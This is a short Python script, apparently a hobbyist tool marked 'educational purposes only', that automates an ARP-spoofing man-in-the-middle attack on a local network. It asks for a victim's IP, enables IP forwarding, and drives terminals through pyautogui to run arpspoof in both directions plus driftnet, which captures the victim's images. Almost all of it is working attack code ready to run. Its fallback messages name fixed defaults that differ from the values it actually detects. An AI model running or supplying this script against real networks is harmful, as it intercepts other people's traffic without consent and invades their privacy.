# Aayush Pokharel
# 2019-12-13
# *Disclamer* made for educational purposes only!

import os
import time
import netifaces as net
import pyautogui

ip_and_stuff = net.gateways()['default'].values()

ip_and_stuff = str(ip_and_stuff).split("'")

ip = ip_and_stuff[1]

iface = ip_and_stuff[3]



routerIp = input(f"router ip? (default {ip}): ")

victimIp = input("victims ip?: ")

interface = input(f"interface? (default {iface}): ")

if len(interface) < 1:
    interface = iface
    print('interface is default wlan0')


if len(routerIp) < 1:
    routerIp = ip
    print('router ip is default 192.168.1.1')


print("port forwarding on....")
os.system("sysctl -w net.ipv4.ip_forward=1")  




print(f"Hi Victim i am {routerIp}\n")

time.sleep(0.5)
print("opening new stand by terminal......")
time.sleep(0.5)

pyautogui.hotkey("ctrl", "alt", "t")
pyautogui.hotkey("ctrl", "alt", "t")
time.sleep(0.5)
pyautogui.typewrite(f"arpspoof -i {interface} -t {routerIp} {victimIp}")
pyautogui.press("enter")

time.sleep(0.5)
pyautogui.hotkey("ctrl", "alt", "t")
time.sleep(0.5)
pyautogui.typewrite(f"driftnet -i {interface}")
pyautogui.press("enter")



print(f"Hi router i am {victimIp}\n")
print('-'*34 + (f"arpspoof -i {interface} -t {victimIp} {routerIp}\n" + '-'*24))
os.system(f"arpspoof -i {interface} -t {victimIp} {routerIp}")

print("-"*30 + '\n')





